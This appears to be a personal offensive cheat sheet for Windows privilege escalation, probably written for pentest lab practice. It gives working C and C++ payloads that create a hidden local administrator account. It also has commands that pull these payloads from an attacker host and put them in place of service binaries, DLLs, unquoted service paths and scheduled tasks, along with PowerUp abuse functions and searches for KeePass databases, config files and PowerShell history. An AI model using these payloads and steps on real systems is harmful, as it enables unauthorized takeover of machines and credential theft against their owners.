SITUATIONAL AWARENESS

whoami /groups

Get-LocalUser

Get-LocalGroup

Get-LocalGroupMember adminteam

systeminfo & Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" } -- SEE IF OS OR HOTFIX HAS RELATED CVE

ipconfig /all

routeprint

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process


SERVICE BINARY HIJACKING

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} -- Look for any files running out of directories that you have write privs.

icacls "<juicyservicebinarypathhere>" -- You want write privs.

If you have full access replace .exe with malicious.exe

For ex use the following exploit written in C.

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe -- then compile

Then grab the exe and move it into the .exe

PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

Attempt to stop and the start service.

net stop mysql

net start mysql

If this doesn't work, look at how service starts via this cmd.

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Try restarting machine.

shutdown /r /t 0




DLL HIJACKING

From previous service cmd, enumerate if any of the applications running have known dll exploits. If they do, determine if you can write to the directory by echoing a test file into directory.

Then, open procmon filter mode to enumerate when dll is used. Processes usually look for DLLs in home directory of application before going to System32. This can be observed in procmon.

If this is the case, you can insert your malicious dll and PWN.

ex malicious dll written in c++

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

x86_64-w64-mingw32-gcc <copyofdllname>.cpp --shared -o <copyofdllname>.dll -- compile

iwr -uri http://<myip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll' -- Downloads it into the directory.

Wait 5 minutes.

Should be pwnage.



UNQUOTED SERVICE PATH INJECTION

Again run same first command from service binary hijacking. -- Finds possible running vuln services. 

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ -- Same command as powershell command but from cmd line.

Start-Service "pwnableservice" -- See if you can start and stop service. If not, see if it starts automatically and try restarting machine.

icacls "C:\"

icacls "C:\Program Files" -- Check privs on directories starting with C:\ going all the way down to where the binary lives.

iwr -uri http://192.168.48.3/adduser.exe -Outfile <nameofpwnablebinary>.exe -- use the same C binary we used in service binary hijacking.

copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe' -- Copy it into directory where binary lives.

Start-Service <pwnableservice> OR restart machine

pwnage.


SCHTASKS

schtasks /query /fo LIST /v -- Finds Scheduled tasks.

icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe -- Again see if you have write access.

Once again replace the binary with the malicious add user binary and wait for schtask to run.



POWERUP

Powerup is able to automate most windows privesc techniques through a .ps1 module.

1. SERVICE ENUM ABUSE

Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set
Get-UnquotedService                 -   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               -   returns services the current user can modify
Get-ServiceDetail                   -   returns detailed information about a specified service
Set-ServiceBinaryPath               -   sets the binary path for a service to a specified value
Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes a custom command
Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes a custom command
Restore-ServiceBinary               -   restores a replaced service binary with the original executable

2. DLL ABUSE

Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     -   writes out a hijackable DLL

3. MISC USE/SCHTASKS

Get-ModifiableScheduledTaskFile     -   find schtasks with modifiable target files
Get-UnattendedInstallFile           -   finds remaining unattended installation files
Get-Webconfig                       -   checks for any encrypted web.config strings
Get-ApplicationHost                 -   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                -   retrieves the plaintext passwords for any found McAfee's SiteList.xml files
Get-CachedGPPPassword               -   checks for passwords in cached Group Policy Preferences files
MISC

1. Finds keepass files.

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

2. If you find XAMPP

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

3. Finds all listed file types

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

4. Find PS history path and then lists it.

(Get-PSReadlineOption).HistorySavePath THEN type "<pathfrompreviouscmd>"
